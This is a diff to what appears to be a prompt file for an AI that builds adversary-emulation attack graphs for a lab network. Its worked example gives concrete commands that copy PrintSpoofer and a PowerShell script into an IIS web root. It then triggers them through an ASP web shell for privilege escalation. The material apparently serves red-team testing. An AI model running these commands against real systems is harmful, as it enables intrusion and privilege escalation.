@@ -135,10 +135,18 @@ prompt: |
 
   **Example 4: Privilege escalation via web shell (commands included)**
 
-  Environment says: "Use IIS web shell with SeImpersonatePrivilege. Web shell at http://192.168.56.105/uploads/cmd.asp. PrintSpoofer64.exe and deploy.ps1 already copied to C:\\inetpub\\wwwroot\\uploads\\"
+  Environment says: "Caldera payloads: PrintSpoofer64.exe, vcruntime140.dll, deploy.ps1. Use IIS web shell with SeImpersonatePrivilege. Web shell at http://192.168.56.105/uploads/cmd.asp."
 
-  Correct node:
+  Correct nodes:
   ```yaml
+  - id: "node_006"
+    name: "Copy PrintSpoofer and Dependencies to Web Root"
+    tactic: "privilege-escalation"
+    description: "Copy privilege escalation tools from agent working directory to web-accessible directory"
+    environment_specific:
+      payloads: ["PrintSpoofer64.exe", "vcruntime140.dll", "deploy.ps1"]
+      commands: "Copy-Item -Path 'PrintSpoofer64.exe' -Destination 'C:\\inetpub\\wwwroot\\uploads\\PrintSpoofer64.exe' -Force; Copy-Item -Path 'vcruntime140.dll' -Destination 'C:\\inetpub\\wwwroot\\uploads\\vcruntime140.dll' -Force; Copy-Item -Path 'deploy.ps1' -Destination 'C:\\inetpub\\wwwroot\\uploads\\deploy.ps1' -Force"
+
   - id: "node_007"
     name: "Execute Privilege Escalation"
     tactic: "privilege-escalation"
@@ -147,7 +155,7 @@ prompt: |
       url: "http://192.168.56.105/uploads/cmd.asp"
       method: "GET"
       exploit: "PrintSpoofer64.exe"
-      commands: "Invoke-WebRequest -Uri 'http://192.168.56.105/uploads/cmd.asp?cmd=start /b C:\\inetpub\\wwwroot\\uploads\\PrintSpoofer64.exe -c \"powershell.exe -ExecutionPolicy Bypass -File C:\\inetpub\\wwwroot\\uploads\\deploy.ps1\"' -UseBasicParsing"
+      commands: "Invoke-WebRequest -Uri 'http://192.168.56.105/uploads/cmd.asp?cmd=C:\\inetpub\\wwwroot\\uploads\\PrintSpoofer64.exe -c \"powershell.exe -ExecutionPolicy Bypass -File C:\\inetpub\\wwwroot\\uploads\\deploy.ps1\"' -UseBasicParsing"
   ```
 
   **Note**: Technique IDs will be added automatically in post-processing using mitreattack-python.
